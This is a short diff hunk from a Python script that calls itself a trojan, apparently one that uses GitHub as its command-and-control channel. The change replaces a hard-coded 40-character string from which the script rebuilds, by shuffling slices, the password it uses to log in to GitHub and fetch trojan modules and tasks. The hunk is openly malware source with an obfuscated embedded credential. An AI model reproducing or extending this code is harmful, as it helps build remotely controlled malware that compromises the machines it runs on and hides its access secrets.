@@ -17,7 +17,7 @@ data_path = "data/%s/" % trojan_id
 trojan_modules = []
 configured = False
 task_queue = Queue.Queue()
-ghp = "6a1473a17a92266686567cd9a77f8ad9f7a71812"
+ghp = "3f8d45b9cba5ee27ff835054106834cc148efad9"
 
 def connect_to_github():
     gh = login(username="cizzit", password=(''.join([ghp[12:23], ghp[-17:], ghp[:12]])))
